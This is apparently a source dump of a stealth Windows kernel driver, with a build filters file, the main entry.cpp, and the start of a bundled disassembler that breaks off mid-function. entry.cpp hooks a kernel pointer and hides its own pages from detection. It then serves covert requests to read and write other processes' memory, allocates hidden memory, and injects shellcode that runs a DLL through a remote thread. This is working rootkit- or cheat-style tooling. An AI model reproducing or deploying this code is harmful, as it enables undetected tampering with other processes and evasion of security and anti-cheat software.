```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClCompile Include="entry.cpp" />
    <ClCompile Include="hde\hde32.cpp" />
    <ClCompile Include="hde\hde64.cpp" />
    <ClCompile Include="utils\utils.cpp" />
    <ClCompile Include="mem\validation.cpp" />
    <ClCompile Include="mem\phys.cpp" />
    <ClCompile Include="mem\mem.cpp" />
    <ClCompile Include="mem\page_table.cpp" />
    <ClCompile Include="utils\intrin.cpp" />
    <ClCompile Include="def\globals.cpp" />
    <ClCompile Include="mem\hyperspace.cpp" />
    <ClCompile Include="mem\pt_hook.cpp" />
    <ClCompile Include="mem\detection.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="def\def.hpp" />
    <ClInclude Include="utils\utils.hpp" />
    <ClInclude Include="def\request.hpp" />
    <ClInclude Include="init.hpp" />
    <ClInclude Include="def\ia32.hpp" />
    <ClInclude Include="mem\scan.hpp" />
    <ClInclude Include="mem\mem.hpp" />
    <ClInclude Include="mem\page_table.hpp" />
    <ClInclude Include="mem\phys.hpp" />
    <ClInclude Include="mem\detection.hpp" />
    <ClInclude Include="mem\hyperspace.hpp" />
    <ClInclude Include="mem\pt_hook.hpp" />
    <ClInclude Include="hde\hde.h" />
    <ClInclude Include="hde\hde_stdint.h" />
    <ClInclude Include="hde\hde32.h" />
    <ClInclude Include="hde\hde64.h" />
    <ClInclude Include="hde\table32.h" />
    <ClInclude Include="hde\table64.h" />
    <ClInclude Include="mem\validation.hpp" />
    <ClInclude Include="utils\intrin.hpp" />
    <ClInclude Include="utils\raii.hpp" />
    <ClInclude Include="def\globals.hpp" />
  </ItemGroup>
  <ItemGroup>
    <None Include="hde\LICENSE" />
  </ItemGroup>
</Project>
```

`driver/entry.cpp`:

```cpp
#include "def/globals.hpp"
#include "utils/raii.hpp"
#include "utils/intrin.hpp"
#include "mem/validation.hpp"
#include "mem/phys.hpp"
#include "mem/page_table.hpp"

#include "mem/scan.hpp"
#include "mem/mem.hpp"
#include "mem/detection.hpp"
#include "utils/utils.hpp"
#include "mem/pt_hook.hpp"
#include "mem/hyperspace.hpp"
#include "init.hpp"
#include "def/request.hpp"

extern "C" void _fltused() {}

namespace {
  constexpr auto request_unique = 0x92b;

  class request_handler {
  public:
    /**
     * @brief Main request dispatcher that validates and routes incoming requests
     * @param a1 Pointer to user-mode request data
     * @param status Pointer to status output parameter
     * @return Result code indicating success or failure
     *
     * Entry point for all user-mode communications. Validates request
     * authenticity, performs safety checks, and dispatches to appropriate handler
     * functions. Only processes requests from user-mode with proper unique
     * identifier.
     */
    static auto handle(void* a1, std::int64_t* status) -> std::int64_t {
      auto current_thread = KeGetCurrentThread();
      char previous_mode =
          *reinterpret_cast<char*>(reinterpret_cast<std::uintptr_t>(current_thread) + 0x232);

      if (previous_mode != UserMode) {
        return reinterpret_cast<decltype(&request_handler::handle)>(globals::hook_pointer)(a1,
                                                                                           status);
      }

      if (!a1 || !mem::probe_user_address(a1, sizeof(request_data), sizeof(unsigned long)) ||
          !mem::safe_copy(&safe_request, a1, sizeof(request_data)) ||
          safe_request.unique != request_unique) {
        return reinterpret_cast<decltype(&request_handler::handle)>(globals::hook_pointer)(a1,
                                                                                           status);
      }

      std::int64_t result = 0;
      switch (safe_request.code) {
        case request_codes::base:
          result = handle_base_request(&safe_request);
          break;
        case request_codes::write:
          result = handle_write_request(&safe_request);
          break;
        case request_codes::read:
          result = handle_read_request(&safe_request);
          break;
        case request_codes::pattern:
          result = handle_pattern_request(&safe_request);
          break;
        case request_codes::swap_context:
          result = handle_swap_context_request(&safe_request);
          break;
        case request_codes::restore_context:
          result = handle_restore_context_request(&safe_request);
          break;
        case request_codes::allocate_independent_pages:
          result = handle_allocate_independent_pages_request(&safe_request);
          break;
        case request_codes::execute_dll_entrypoint:
          result = handle_execute_dll_via_thread_request(&safe_request);
          break;
        case request_codes::unload:
          result = handle_unload_request(&safe_request);
          break;
        default:
          if (status) {
            *status = STATUS_NOT_IMPLEMENTED;
          }
          result = 0;
          break;
      }

      return result;
    }

  private:
    static inline request_data safe_request{};

    /**
     * @brief Template function for safe copying from user-mode memory
     * @tparam T Type of structure to copy
     * @param dest Destination buffer in kernel space
     * @param src Source buffer in user space
     * @return true if copy succeeded, false otherwise
     *
     * Type-safe wrapper around mem::safe_copy that automatically determines
     * the size based on the template parameter.
     */
    template <typename T>
    static auto safe_copy(T* dest, void* src) -> bool {
      return mem::safe_copy(dest, src, sizeof(T));
    }

    /**
     * @brief Handle module base address lookup requests
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Looks up the base address of a specified module in a target process
     * and returns it to the caller through the request structure.
     */
    static auto handle_base_request(request_data* request) -> std::int64_t {
      log("INFO", "base request called");

      base_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      if (!data.pid) {
        return 0;
      }

      const auto base = utils::get_module_base(data.pid, data.name);
      if (!base) {
        return 0;
      }

      reinterpret_cast<base_request*>(request->data)->handle = base;
      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Handle memory write requests to target processes
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Performs memory writes to target processes, automatically using hyperspace
     * context if available, otherwise falling back to standard process access.
     */
    static auto handle_write_request(request_data* request) -> std::int64_t {
      write_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      if (!data.address || !data.pid || !data.buffer || !data.size) {
        return 0;
      }

      PEPROCESS target_process = nullptr;
      if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(data.pid),
                                                   &target_process) != STATUS_SUCCESS) {
        return 0;
      }

      raii::kernel_object_ref<_KPROCESS> target_ref(target_process);

      NTSTATUS status = STATUS_SUCCESS;
      if (globals::ctx.initialized) {
        status = physical::copy_memory(
            globals::io_get_current_process(), reinterpret_cast<void*>(data.buffer),
            globals::ctx.clone_peproc, reinterpret_cast<void*>(data.address), data.size);
      } else {
        status = physical::copy_memory(globals::io_get_current_process(),
                                       reinterpret_cast<void*>(data.buffer), target_process,
                                       reinterpret_cast<void*>(data.address), data.size);
      }

      if (!NT_SUCCESS(status)) {
        return 0;
      }

      reinterpret_cast<write_request*>(request->data)->success = true;

      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Handle memory read requests from target processes
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Performs memory reads from target processes, automatically using hyperspace
     * context if available, otherwise falling back to standard process access.
     */
    static auto handle_read_request(request_data* request) -> std::int64_t {
      read_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      if (!data.address || !data.pid || !data.buffer || !data.size) {
        return 0;
      }

      PEPROCESS target_process = nullptr;
      if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(data.pid),
                                                   &target_process) != STATUS_SUCCESS) {
        return 0;
      }

      raii::kernel_object_ref<_KPROCESS> target_ref(target_process);

      NTSTATUS status = STATUS_SUCCESS;
      if (globals::ctx.initialized) {
        status = physical::copy_memory(
            globals::ctx.clone_peproc, reinterpret_cast<void*>(data.address),
            globals::io_get_current_process(), reinterpret_cast<void*>(data.buffer), data.size);
      } else {
        status = physical::copy_memory(target_process, reinterpret_cast<void*>(data.address),
                                       globals::io_get_current_process(),
                                       reinterpret_cast<void*>(data.buffer), data.size);
      }

      if (!NT_SUCCESS(status)) {
        return 0;
      }

      reinterpret_cast<read_request*>(request->data)->success = true;

      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Handle DLL execution via remote thread creation
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Creates and executes a remote thread that calls a DLL's entry point with
     * proper parameters. Supports both normal and hyperspace execution contexts
     * with automatic shellcode injection and cleanup.
     */
    static auto handle_execute_dll_via_thread_request(request_data* request) -> std::int64_t {
      log("INFO", "execute dll via thread request called");

      execute_dll_via_thread_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      if (!data.alloc_base || !data.entry_point || !data.target_pid) {
        log("ERROR", "invalid parameters for DLL execution");
        return 0;
      }

      std::uint8_t dll_main_shellcode[50] = {
          0x48, 0x83, 0xEC, 0x28, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x01,
          0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28, 0xC3};

      const unsigned long dll_base_offset = 0x6;
      const unsigned long entry_point_offset = 0x10;

      // use RAII for kernel buffer
      raii::kernel_memory kernel_shellcode(PAGE_SIZE);
      if (!kernel_shellcode.is_valid()) {
        log("ERROR", "failed to allocate kernel buffer for shellcode");
        return 0;
      }

      globals::memcpy(kernel_shellcode.get(), dll_main_shellcode, sizeof(dll_main_shellcode));

      *(std::uintptr_t*)((std::uintptr_t)kernel_shellcode.get() + dll_base_offset) =
          (std::uintptr_t)data.alloc_base;
      *(std::uintptr_t*)((std::uintptr_t)kernel_shellcode.get() + entry_point_offset) =
          (std::uintptr_t)data.alloc_base + data.entry_point;

      void* remote_shellcode = allocate_memory_by_mode(data.local_pid, data.target_pid, PAGE_SIZE,
                                                       memory_type::NORMAL_PAGE, data.alloc_mode);
      if (!remote_shellcode) {
        log("ERROR", "failed to allocate remote shellcode");
        return 0;
      }

      // get target process with RAII
      PEPROCESS target_process = nullptr;
      if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(data.target_pid),
                                                   &target_process) != STATUS_SUCCESS) {
        log("ERROR", "failed to get target process");
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(remote_shellcode),
                                           PAGE_SIZE);
        return 0;
      }

      raii::kernel_object_ref<_KPROCESS> target_ref(target_process);

      NTSTATUS write_status = STATUS_SUCCESS;
      if (globals::ctx.initialized) {
        write_status = physical::copy_memory(globals::io_get_current_process(),
                                             kernel_shellcode.get(), globals::ctx.clone_peproc,
                                             remote_shellcode, sizeof(dll_main_shellcode));
      } else {
        write_status =
            physical::copy_memory(globals::io_get_current_process(), kernel_shellcode.get(),
                                  target_process, remote_shellcode, sizeof(dll_main_shellcode));
      }

      if (!NT_SUCCESS(write_status)) {
        log("ERROR", "failed to write shellcode to target process");
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(remote_shellcode),
                                           PAGE_SIZE);
        return 0;
      }

      // use RAII for handles
      raii::kernel_handle process_handle;
      OBJECT_ATTRIBUTES obj_attr = {0};
      CLIENT_ID process_client_id = {0};
      process_client_id.UniqueProcess = reinterpret_cast<HANDLE>(data.target_pid);

      InitializeObjectAttributes(&obj_attr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

      NTSTATUS open_status = globals::zw_open_process(
          process_handle.address_of(), PROCESS_ALL_ACCESS, &obj_attr, &process_client_id);

      if (!NT_SUCCESS(open_status)) {
        log("ERROR", "failed to open target process: 0x%X", open_status);
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(remote_shellcode),
                                           PAGE_SIZE);
        return 0;
      }

      raii::kernel_handle thread_handle;
      CLIENT_ID thread_client_id = {0};

      NTSTATUS thread_status = globals::rtl_create_user_thread(
          process_handle.get(), NULL, TRUE, 0, 0, 0, remote_shellcode, NULL,
          thread_handle.address_of(), &thread_client_id);

      if (!NT_SUCCESS(thread_status)) {
        log("ERROR", "RtlCreateUserThread failed with status: 0x%X", thread_status);
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(remote_shellcode),
                                           PAGE_SIZE);
        return 0;
      }

      PETHREAD thread = nullptr;
      NTSTATUS thread_lookup_status =
          globals::ps_lookup_thread_by_thread_id(thread_client_id.UniqueThread, &thread);
      if (!NT_SUCCESS(thread_lookup_status)) {
        log("ERROR", "PsLookupThreadByThreadId failed with status: 0x%X", thread_lookup_status);
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(remote_shellcode),
                                           PAGE_SIZE);
        return 0;
      }

      raii::kernel_object_ref<_KTHREAD> thread_ref(thread);

      if (globals::ctx.initialized) {
        NTSTATUS swap_context = hyperspace::switch_thread_context_to_hyperspace(
            (uint32_t)thread_client_id.UniqueThread, &globals::ctx);
        if (!NT_SUCCESS(swap_context)) {
          log("ERROR", "hyperspace::switch_thread_context_to_hyperspace failed: 0x%X",
              swap_context);
          return 0;
        }
      }

      unsigned long previous_suspend_count = 0;
      NTSTATUS resume_thread_status = globals::ps_resume_thread(thread, &previous_suspend_count);
      if (!NT_SUCCESS(resume_thread_status)) {
        log("ERROR", "PsResumeThread failed with status: 0x%X", resume_thread_status);
        globals::mm_free_independent_pages(reinterpret_cast<uintptr_t>(remote_shellcode),
                                           PAGE_SIZE);
        return 0;
      }

      if (thread_handle.is_valid()) {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -150000000LL;

        NTSTATUS wait_status =
            globals::zw_wait_for_single_object(thread_handle.get(), FALSE, &timeout);
        if (wait_status == STATUS_TIMEOUT) {
          log("WARNING", "thread execution timed out after 15 seconds");
        } else if (NT_SUCCESS(wait_status)) {
          log("INFO", "thread completed successfully");
        } else {
          log("ERROR", "wait failed with status: 0x%X", wait_status);
        }
      }

      // clear shellcode
      std::uint8_t zero_buffer[sizeof(dll_main_shellcode)] = {0};
      if (globals::ctx.initialized) {
        physical::copy_memory(globals::io_get_current_process(), zero_buffer,
                              globals::ctx.clone_peproc, remote_shellcode,
                              sizeof(dll_main_shellcode));
      } else {
        PEPROCESS cleanup_process = nullptr;
        if (globals::ps_lookup_process_by_process_id(reinterpret_cast<HANDLE>(data.target_pid),
                                                     &cleanup_process) == STATUS_SUCCESS) {
          raii::kernel_object_ref<_KPROCESS> cleanup_ref(cleanup_process);
          physical::copy_memory(globals::io_get_current_process(), zero_buffer, cleanup_process,
                                remote_shellcode, sizeof(dll_main_shellcode));
        }
      }

      log("INFO", "DLL execution completed for PID: %d at address: 0x%p", data.target_pid,
          data.alloc_base);

      reinterpret_cast<execute_dll_via_thread_request*>(request->data)->success = true;
      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Handle pattern scanning requests in target process modules
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Scans for byte patterns within specified modules of target processes
     * and returns the first matching address.
     */
    static auto handle_pattern_request(request_data* request) -> std::int64_t {
      log("INFO", "pattern request called");

      pattern_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      std::uintptr_t r_address = 0;
      NTSTATUS status =
          scan::find_pattern_usermode(data.pid, data.mod_name, data.signature, r_address);

      if (!NT_SUCCESS(status) || !r_address) {
        return 0;
      }

      reinterpret_cast<pattern_request*>(request->data)->address = r_address;
      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Allocate memory using the specified allocation strategy
     * @param local_pid Current process ID
     * @param target_pid Target process ID for allocation
     * @param size Size of memory to allocate
     * @param mem_type Whether to use 4KB, 2MB, or 1GB pages
     * @param alloc_mode Allocation strategy mode
     * @return Pointer to allocated memory, or nullptr on failure
     *
     * Router function that selects the appropriate allocation method based on
     * the specified mode (hyperspace, between modules, high/low address, etc.).
     */
    static auto allocate_memory_by_mode(uint32_t local_pid, uint32_t target_pid, size_t size,
                                        memory_type mem_type, uint32_t alloc_mode) -> void* {
      switch (alloc_mode) {
        case ALLOC_INSIDE_MAIN_MODULE:
          return mem::hijack_null_pfn(local_pid, target_pid, size);
        case ALLOC_BETWEEN_LEGIT_MODULES:
          return mem::allocate_between_modules(local_pid, target_pid, size);
        case ALLOC_AT_LOW_ADDRESS:
          return mem::allocate_at_non_present_pml4e(local_pid, target_pid, size, mem_type,
                                                    memory_space::USER_MODE);
        case ALLOC_AT_HIGH_ADDRESS:
          return mem::allocate_at_non_present_pml4e(local_pid, target_pid, size, mem_type,
                                                    memory_space::KERNEL_MODE);
        case ALLOC_AT_HYPERSPACE:
          return hyperspace::allocate_in_hyperspace(target_pid, size, mem_type);
        default:
          return mem::allocate_between_modules(local_pid, target_pid, size);
      }
    }

    /**
     * @brief Handle stealth memory allocation requests
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Allocates memory using various stealth techniques. Automatically
     * initializes hyperspace context if hyperspace allocation is requested and
     * not yet initialized.
     */
    static auto handle_allocate_independent_pages_request(request_data* request) -> std::int64_t {
      log("INFO", "allocate independent pages request called");

      allocate_independent_pages_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      auto hyperspace_cleanup = [&]() {
        hyperspace::cleanup_hyperspace_context(&globals::ctx);

        if (hyperspace::callbacks::g_process_callback_handle) {
          globals::ps_set_create_process_notify_routine_ex(
              reinterpret_cast<PCREATE_PROCESS_NOTIFY_ROUTINE_EX>(
                  hyperspace::callbacks::g_callback_shellcode_address),
              TRUE);
          hyperspace::callbacks::g_process_callback_handle = nullptr;
          hyperspace::callbacks::g_callback_shellcode_address = nullptr;
        }
      };

      void* address = nullptr;

      // handle hyperspace initialization if needed
      if (data.mode == ALLOC_AT_HYPERSPACE && !globals::ctx.initialized) {
        NTSTATUS hyperspace_context_status =
            hyperspace::initialize_hyperspace_context(data.target_pid, &globals::ctx);
        if (!NT_SUCCESS(hyperspace_context_status)) {
          log("INFO", "failed to init hyperspace context");
          return 0;
        }

        NTSTATUS install_status = hyperspace::callbacks::install_process_callback();
        if (!NT_SUCCESS(install_status)) {
          log("ERROR", "failed to install process callback in ntoskrnl");
          hyperspace_cleanup();
          return 0;
        }

        NTSTATUS create_contextualized_ntoskrnl_status =
            hyperspace::create_contextualized_ntoskrnl();
        if (!NT_SUCCESS(create_contextualized_ntoskrnl_status)) {
          log("INFO", "create contextualized ntoskrnl failed");
          hyperspace_cleanup();
          return 0;
        }
      }

      address = allocate_memory_by_mode(data.local_pid, data.target_pid, data.size, data.mem_type,
                                        data.mode);

      if (!address) {
        if (data.mode == ALLOC_AT_HYPERSPACE) {
          log("INFO", "hyperspace allocation failed, cleaning up");
          hyperspace_cleanup();
        }
        return 0;
      }

      if (data.mode == ALLOC_AT_HYPERSPACE) {
        log("INFO", "hyperspace allocation completed at address: 0x%p", address);
      }

      reinterpret_cast<allocate_independent_pages_request*>(request->data)->address = address;
      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Handle thread context switching to hyperspace
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Switches a target thread's execution context to hyperspace, allowing it
     * to access hyperspace-allocated memory and execute within the isolated
     * environment.
     */
    static auto handle_swap_context_request(request_data* request) -> std::int64_t {
      log("INFO", "swap context request called");

      swap_context_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      if (!globals::ctx.initialized) {
        return 0;
      }

      NTSTATUS switch_context_status =
          hyperspace::switch_thread_context_to_hyperspace(data.target_tid, &globals::ctx);
      if (!NT_SUCCESS(switch_context_status)) {
        return 0;
      }

      reinterpret_cast<swap_context_request*>(request->data)->success = true;

      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Handle thread context restoration from hyperspace
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Restores a thread's execution context from hyperspace back to the original
     * process context, returning it to normal execution environment.
     */
    static auto handle_restore_context_request(request_data* request) -> std::int64_t {
      log("INFO", "restore context request called");

      swap_context_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      if (!globals::ctx.initialized) {
        return 0;
      }

      NTSTATUS restore_context_status =
          hyperspace::switch_from_hyperspace(data.target_tid, &globals::ctx);
      if (!NT_SUCCESS(restore_context_status)) {
        return 0;
      }

      reinterpret_cast<swap_context_request*>(request->data)->success = true;
      return static_cast<std::int64_t>(request_codes::success);
    }

    /**
     * @brief Handle driver unload and cleanup requests
     * @param request Pointer to validated request data
     * @return Request result code
     *
     * Performs driver cleanup by restoring original hook pointers, clearing
     * shellcode, and setting appropriate page protections for safe unloading.
     */
    static auto handle_unload_request(request_data* request) -> std::int64_t {
      log("INFO", "unload/unhook .data ptr request called");

      unload_request data;
      if (!safe_copy(&data, request->data)) {
        return 0;
      }

      if (!data.success || !globals::hook_address || !globals::shell_address) {
        log("ERROR", "invalid unload request parameters");
        return 0;
      }

      *data.success = true;

      // restore original hook
      *reinterpret_cast<std::uintptr_t*>(globals::hook_address) = globals::hook_pointer;

      // clear and unprotect shellcode
      page_table::spoof_pte_range(reinterpret_cast<uintptr_t>(globals::shell_address),
                                  globals::SHELL_SIZE_FJ, true);

      globals::memset(globals::shell_address, 0, globals::SHELL_SIZE_FJ);

      return static_cast<std::int64_t>(request_codes::success);
    }
  };

}  // namespace

/**
 * @brief Main driver entry point and initialization function
 * @param io_get_current_process_addr Address of IoGetCurrentProcess function
 * @param mm_copy_virtual_memory_addr Address of MmCopyVirtualMemory function
 * @param offsets Pointer to PDB offset structure from loader
 * @return NTSTATUS indicating initialization success or failure
 *
 * Initializes the driver by copying PDB offsets, scanning for required system
 * functions, hiding driver pages from detection, and installing the main
 * communication hook. Called by the driver loader with resolved function
 * addresses and offset information.
 */
auto entry(uintptr_t io_get_current_process_addr, uintptr_t mm_copy_virtual_memory_addr,
           pdb_offsets* offsets) -> NTSTATUS {
  if (!io_get_current_process_addr || !mm_copy_virtual_memory_addr || !offsets) {
    return STATUS_INVALID_PARAMETER_1;
  }

  auto io_get_current_process =
      reinterpret_cast<function_types::io_get_current_process_t>(io_get_current_process_addr);
  auto mm_copy_virtual_memory =
      reinterpret_cast<function_types::mm_copy_virtual_memory_t>(mm_copy_virtual_memory_addr);

  if (!io_get_current_process || !mm_copy_virtual_memory) {
    return STATUS_INVALID_PARAMETER_2;
  }

  pdb_offsets local_offsets = {0};
  size_t bytes = 0;
  const auto current_process = io_get_current_process();

  if (!current_process) {
    return STATUS_INVALID_PARAMETER_3;
  }

  NTSTATUS copy_status =
      mm_copy_virtual_memory(current_process, offsets, current_process, &local_offsets,
                             sizeof(pdb_offsets), KernelMode, &bytes);

  if (!NT_SUCCESS(copy_status) || bytes != sizeof(pdb_offsets)) {
    return STATUS_INVALID_PARAMETER_4;
  }

  auto status_offsets = init::scan_offsets(local_offsets);
  if (!NT_SUCCESS(status_offsets)) {
    log("ERROR", "driver entry fail, failed to init global variables: 0x%X", status_offsets);
    return status_offsets;
  }

  auto status_hide = init::hide_driver_pages(globals::driver_alloc_base, globals::driver_size);
  if (!NT_SUCCESS(status_hide)) {
    log("ERROR", "driver entry fail, failed to hide driver pages: 0x%X", status_hide);
    return status_hide;
  }

  auto status_hook = init::install_hook(&request_handler::handle);
  if (!NT_SUCCESS(status_hook)) {
    log("ERROR", "driver entry fail, failed to install hook: 0x%X", status_hook);
    return status_hook;
  }

  log("INFO", "driver initialized successfully");
  return STATUS_SUCCESS;
}
```

`driver/hde/LICENSE`:

```
The source code contained in this directory is Copyright (c) 2008-2009,
Vyacheslav Patkov. It has been modified for integration with the parent
project.

===============================================================================

License agreement

Hacker Disassembler Engine 32 C
Copyright (c) 2008-2009, Vyacheslav Patkov.
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions
are met:

 1. Redistributions of source code must retain the above copyright
    notice, this list of conditions and the following disclaimer.
 2. Redistributions in binary form must reproduce the above copyright
    notice, this list of conditions and the following disclaimer in the
    documentation and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

===============================================================================

License agreement

Hacker Disassembler Engine 64 C
Copyright (c) 2008-2009, Vyacheslav Patkov.
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions
are met:

 1. Redistributions of source code must retain the above copyright
    notice, this list of conditions and the following disclaimer.
 2. Redistributions in binary form must reproduce the above copyright
    notice, this list of conditions and the following disclaimer in the
    documentation and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`driver/hde/hde.h`:

```h
#pragma once

//
// The maximum amount of bytes the disassembler will read from the code buffer
//  before failing.
//
// NOTE This number was taken from the 'Hacker Disassembler Engine 64 C 0.04
//  FINAL' manual and has not been verified.
//
#define HDE_BUFFER_READ_SIZE_MAX    26

#if defined(_WIN64)
#include "hde64.h"

typedef hde64s HDE_DISASSEMBLY;

#define HdeDisassemble  hde64_disasm
#else
#include "hde32.h"

typedef hde32s HDE_DISASSEMBLY;

#define HdeDisassemble  hde32_disasm
#endif

```

`driver/hde/hde32.cpp`:

```cpp
/*
 * Hacker Disassembler Engine 32 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#include "hde32.h"

#include <intrin.h>

#include "table32.h"

#pragma warning(push)
#pragma warning(disable:4701)

unsigned int hde32_disasm(const void* code, hde32s* hs)
{
	uint8_t x, c, * p = (uint8_t*)code, cflags, opcode, pref = 0;
	uint8_t* ht = hde32_table, m_mod, m_reg, m_rm, disp_size = 0;

	__stosb((unsigned char*)hs, 0, sizeof(hde32s));

	for (x = 16; x; x--)
		switch (c = *p++) {
		case 0xf3:
			hs->p_rep = c;
			pref |= PRE_F3;
			break;
		case 0xf2:
			hs->p_rep = c;
			pref |= PRE_F2;
			break;
		case 0xf0:
			hs->p_lock = c;
			pref |= PRE_LOCK;
			break;
		case 0x26: case 0x2e: case 0x36:
		case 0x3e: case 0x64: case 0x65:
			hs->p_seg = c;
			pref |= PRE_SEG;
			break;
		case 0x66:
			hs->p_66 = c;
			pref |= PRE_66;
			break;
		case 0x67:
			hs->p_67 = c;
			pref |= PRE_67;
			break;
		default:
			goto pref_done;
		}
pref_done:

	hs->flags = (uint32_t)pref << 23;

	if (!pref)
		pref |= PRE_NONE;

	if ((hs->opcode = c) == 0x0f) {
		hs->opcode2 = c = *p++;
		ht += DELTA_OPCODES;
	}
	else if (c >= 0xa0 && c <= 0xa3) {
		if (pref & PRE_67)
			pref |= PRE_66;
		else
			pref &= ~PRE_66;
	}

	opcode = c;
	cflags = ht[ht[opcode / 4] + (opcode % 4)];

	if (cflags == C_ERROR) {
		hs->flags |= F_ERROR | F_ERROR_OPCODE;
		cflags = 0;
		if ((opcode & -3) == 0x24)
			cflags++;
	}

	x = 0;
	if (cflags & C_GROUP) {
		uint16_t t;
		t = *(uint16_t*)(ht + (cflags & 0x7f));
		cflags = (uint8_t)t;
		x = (uint8_t)(t >> 8);
	}

	if (hs->opcode2) {
		ht = hde32_table + DELTA_PREFIXES;
		if (ht[ht[opcode / 4] + (opcode % 4)] & pref)
			hs->flags |= F_ERROR | F_ERROR_OPCODE;
	}

	if (cflags & C_MODRM) {
		hs->flags |= F_MODRM;
		hs->modrm = c = *p++;
		hs->modrm_mod = m_mod = c >> 6;
		hs->modrm_rm = m_rm = c & 7;
		hs->modrm_reg = m_reg = (c & 0x3f) >> 3;

		if (x && ((x << m_reg) & 0x80))
			hs->flags |= F_ERROR | F_ERROR_OPCODE;

		if (!hs->opcode2 && opcode >= 0xd9 && opcode <= 0xdf) {
			uint8_t t = opcode - 0xd9;
			if (m_mod == 3) {
				ht = hde32_table + DELTA_FPU_MODRM + t * 8;
				t = ht[m_reg] << m_rm;
			}
			else {
				ht = hde32_table + DELTA_FPU_REG;
				t = ht[t] << m_reg;
			}
			if (t & 0x80)
				hs->flags |= F_ERROR | F_ERROR_OPCODE;
		}

		if (pref & PRE_LOCK) {
			if (m_mod == 3) {
				hs->flags |= F_ERROR | F_ERROR_LOCK;
			}
			else {
				uint8_t* table_end, op = opcode;
				if (hs->opcode2) {
					ht = hde32_table + DELTA_OP2_LOCK_OK;
					table_end = ht + DELTA_OP_ONLY_MEM - DELTA_OP2_LOCK_OK;
				}
				else {
					ht = hde32_table + DELTA_OP_LOCK_OK;
					table_end = ht + DELTA_OP2_LOCK_OK - DELTA_OP_LOCK_OK;
					op &= -2;
				}
				for (; ht != table_end; ht++)
					if (*ht++ == op) {
